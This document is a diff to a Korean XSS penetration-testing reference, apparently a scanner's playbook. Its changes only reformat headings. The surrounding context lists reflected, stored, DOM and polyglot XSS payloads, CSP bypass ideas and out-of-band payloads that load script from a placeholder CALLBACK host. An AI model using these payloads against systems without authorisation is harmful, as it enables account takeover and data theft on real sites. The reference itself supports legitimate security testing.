@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**Reflected:**
+#### Reflected
 - `<script>alert(1)</script>` (HTML body) — 기본
 - `<img src=x onerror=alert(1)>` (HTML body) — `<script>` 차단 시
 - `<svg/onload=alert(1)>` (HTML body) — 짧은 페이로드 (28자)
@@ -12,16 +12,16 @@
 - `<video><source onerror=alert(1)>` (HTML body)
 - `<isindex action=javascript:alert(1) type=image>` (구 브라우저)
 
-**Stored:**
+#### Stored
 - 1차: 댓글/닉네임/프로필/리뷰/이메디터 등에 위 페이로드 저장
 - 2차: 해당 데이터를 출력하는 페이지(`Accept: text/html`) 방문
 - SPA: Playwright로 alert dialog/DOM 검증
 
-**DOM (서버 미경유는 dom-xss-scanner 위임):**
+#### DOM (서버 미경유는 dom-xss-scanner 위임)
 - `#<img src=x onerror=alert(1)>` (location.hash)
 - `?q=<svg/onload=alert(1)>` (URL encoded query)
 
-**컨텍스트별:**
+#### 컨텍스트별
 
 | 컨텍스트 | 페이로드 |
 |---|---|
@@ -36,18 +36,18 @@
 | JSON in HTML script | `</script><script>alert(1)//` |
 | SVG 컨텍스트 | `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>` |
 
-**OOB / Blind:**
+#### OOB / Blind
 - `<img src=//CALLBACK.oast.fun/x>` — 외부 fetch 발생 시 확인
 - `<script src=//CALLBACK/x.js></script>` — JS 실행 발생 시 확인
 
-**도구 선택:**
+#### 도구 선택
 
 | 렌더링 | 도구 | 검증 |
 |---|---|---|
 | 서버 (ERB/Slim/Jinja2/JSP/Blade) | curl + `Accept: text/html` | 응답 본문에 escape 없이 반영 |
 | 클라이언트 (React/Vue/Angular `dangerouslySetInnerHTML`) | Playwright | `dialog` 발화 또는 DOM 삽입 |
 
-**Playwright 검증 스크립트:**
+#### Playwright 검증 스크립트
 ```javascript
 const { chromium } = require('playwright');
 (async () => {
@@ -87,12 +87,12 @@ const { chromium } = require('playwright');
 | CSP `unsafe-inline` 차단 | `<base href=//evil>` 으로 상대 경로 script src 변조, dangling script tag |
 | CSP nonce | nonce 누출 (응답 본문/JS에 노출 시 재사용), DOM clobbering으로 nonce 우회 |
 
-**Polyglot (다중 컨텍스트 동시 트리거):**
+#### Polyglot (다중 컨텍스트 동시 트리거)
 ```
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
 ```
 
-**Markdown XSS (marked/markdown-it `html: true`):**
+#### Markdown XSS (marked/markdown-it `html: true`)
 ```
 [click](javascript:alert(1))
 ![alt](x" onerror=alert(1) ")
